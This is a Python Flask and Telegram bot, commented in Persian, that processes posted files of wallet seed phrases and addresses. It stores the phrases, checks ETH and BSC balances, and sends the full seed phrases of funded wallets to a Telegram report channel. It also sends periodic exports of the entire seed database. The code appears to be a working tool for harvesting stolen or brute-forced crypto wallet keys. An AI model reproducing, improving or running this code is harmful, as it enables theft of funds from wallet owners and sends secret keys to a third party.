import os
import re
import logging
import asyncio
import queue
import threading
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1003893481541

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

DB_PATH = "wallets.db"

app = Flask(__name__)
file_queue = queue.Queue()

# ----------------- دیتابیس -----------------
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS wallets (
            address TEXT PRIMARY KEY,
            seed TEXT,
            added_at TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS meta (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_wallet(address: str, seed: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT OR IGNORE INTO wallets (address, seed, added_at) VALUES (?, ?, ?)",
        (address.lower(), seed.strip(), datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def get_all_wallets():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address, seed FROM wallets")
    rows = c.fetchall()
    conn.close()
    return rows

def get_meta(key, default=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM meta WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default

def set_meta(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO meta (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

# ----------------- موجودی -----------------
def get_wallet_total(address: str) -> dict:
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except:
            continue
    return totals

# ----------------- پردازش فایل -----------------
async def process_one_file(doc):
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=30.0, connect_timeout=20.0, read_timeout=30.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    try:
        logging.info(f"=== Start: {doc.file_name} ===")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)
        logging.info(f"Found {len(matches)} entries")

        if not matches:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ موردی پیدا نشد.")
            return

        # ذخیره در دیتابیس
        for phrase, addr in matches:
            save_wallet(addr, phrase)

        test_id_match = re.search(r"تعداد تست[:\s]*(\d+)", text)
        test_id = test_id_match.group(1) if test_id_match else "نامشخص"

        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=f"📥 شروع اسکن `{doc.file_name}`\n🔢 تعداد: `{len(matches)}`\n🆔 تست: `{test_id}`"
        )

        file_totals = {'ETH': 0.0, 'BSC': 0.0}
        rich_wallets = []
        batch_size = 300

        for i in range(0, len(matches), batch_size):
            batch = matches[i:i + batch_size]
            logging.info(f"Batch {i//batch_size + 1}")

            with ThreadPoolExecutor(max_workers=6) as executor:
                loop = asyncio.get_running_loop()
                tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for _, addr in batch]
                results = await asyncio.gather(*tasks)

            for (phrase, addr), res in zip(batch, results):
                file_totals['ETH'] += res['ETH']
                file_totals['BSC'] += res['BSC']
                if res['ETH'] + res['BSC'] > 0.00001:
                    rich_wallets.append({'phrase': phrase.strip(), 'address': addr, 'balances': res})

            await bot.send_message(
                chat_id=REPORT_CHANNEL,
                text=f"✅ دسته {i//batch_size + 1} | موجودی‌دار: `{len(rich_wallets)}`"
            )

        # گزارش نهایی فایل
        final_report = (
            f"📊 **گزارش فایل**\n"
            f"📄 `{doc.file_name}`\n"
            f"🆔 تست: `{test_id}`\n"
            f"🔢 تعداد: `{len(matches)}`\n"
            f"──────────────────\n"
            f"🔹 ETH: `{file_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{file_totals['BSC']:.6f}`\n"
            f"💰 دارای موجودی: `{len(rich_wallets)}`"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=final_report, parse_mode='Markdown')

        for wallet in rich_wallets:
            msg = f"`{wallet['address']}`\n🔑 `{wallet['phrase']}`\n"
            if wallet['balances']['ETH'] > 0:
                msg += f"• ETH: `{wallet['balances']['ETH']:.6f}`\n"
            if wallet['balances']['BSC'] > 0:
                msg += f"• BSC: `{wallet['balances']['BSC']:.6f}`\n"
            await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
            await asyncio.sleep(0.4)

        logging.info(f"=== Finished: {doc.file_name} ===")

    except Exception as e:
        logging.error(f"Error: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا: {str(e)[:200]}")
        except:
            pass

# ----------------- گزارش ماهانه -----------------
async def monthly_report():
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=30.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        return

    logging.info(f"Starting monthly report for {len(wallets)} wallets")

    await bot.send_message(chat_id=REPORT_CHANNEL, text=f"📅 **شروع گزارش ماهانه**\nتعداد ولت در دیتابیس: `{len(wallets)}`")

    totals = {'ETH': 0.0, 'BSC': 0.0}
    rich = []

    batch_size = 300
    for i in range(0, len(wallets), batch_size):
        batch = wallets[i:i + batch_size]
        with ThreadPoolExecutor(max_workers=6) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr, _ in batch]
            results = await asyncio.gather(*tasks)

        for (addr, seed), res in zip(batch, results):
            totals['ETH'] += res['ETH']
            totals['BSC'] += res['BSC']
            if res['ETH'] + res['BSC'] > 0.00001:
                rich.append({'address': addr, 'seed': seed, 'balances': res})

    report = (
        f"📊 **گزارش ماهانه**\n"
        f"📅 تاریخ: `{datetime.utcnow().strftime('%Y-%m-%d')}`\n"
        f"🔢 تعداد کل ولت: `{len(wallets)}`\n"
        f"──────────────────\n"
        f"🔹 ETH: `{totals['ETH']:.6f}`\n"
        f"🔹 BSC: `{totals['BSC']:.6f}`\n"
        f"💰 دارای موجودی: `{len(rich)}`"
    )
    await bot.send_message(chat_id=REPORT_CHANNEL, text=report, parse_mode='Markdown')

    for w in rich:
        msg = f"`{w['address']}`\n🔑 `{w['seed']}`\n"
        if w['balances']['ETH'] > 0:
            msg += f"• ETH: `{w['balances']['ETH']:.6f}`\n"
        if w['balances']['BSC'] > 0:
            msg += f"• BSC: `{w['balances']['BSC']:.6f}`\n"
        await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
        await asyncio.sleep(0.4)

    set_meta("last_monthly", datetime.utcnow().isoformat())

# ----------------- ارسال فایل دیتابیس هر ۳ ماه -----------------
async def send_full_database():
    request_config = HTTPXRequest(connection_pool_size=10)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        return

    content = f"Database Export - {datetime.utcnow().isoformat()}\nTotal: {len(wallets)}\n\n"
    for addr, seed in wallets:
        content += f"Phrase: {seed} | Addr: {addr}\n"

    with open("database_export.txt", "w", encoding="utf-8") as f:
        f.write(content)

    await bot.send_document(
        chat_id=REPORT_CHANNEL,
        document=open("database_export.txt", "rb"),
        caption=f"📦 خروجی کامل دیتابیس\nتعداد: `{len(wallets)}`"
    )
    set_meta("last_export", datetime.utcnow().isoformat())

# ----------------- زمان‌بندی -----------------
def scheduler():
    while True:
        try:
            now = datetime.utcnow()
            last_monthly = get_meta("last_monthly")
            last_export = get_meta("last_export")

            # گزارش ماهانه (اول هر ماه)
            if last_monthly is None or (now - datetime.fromisoformat(last_monthly)).days >= 28:
                if now.day <= 3:  # فقط چند روز اول ماه
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(monthly_report())
                    loop.close()

            # خروجی هر ۳ ماه
            if last_export is None or (now - datetime.fromisoformat(last_export)).days >= 90:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(send_full_database())
                loop.close()

        except Exception as e:
            logging.error(f"Scheduler error: {e}")

        # هر ۶ ساعت چک کن
        threading.Event().wait(6 * 3600)

# ----------------- Worker -----------------
def worker():
    while True:
        doc = file_queue.get()
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(process_one_file(doc))
            loop.close()
        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            file_queue.task_done()

# ----------------- شروع -----------------
init_db()
threading.Thread(target=worker, daemon=True).start()
threading.Thread(target=scheduler, daemon=True).start()

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot=None)

    if update and update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            file_queue.put(update.channel_post.document)
            logging.info(f"Added to queue: {update.channel_post.document.file_name}")

    return "OK"

@app.route('/')
def health():
    return f"Bot running | Queue: {file_queue.qsize()} | DB wallets: {len(get_all_wallets())}"
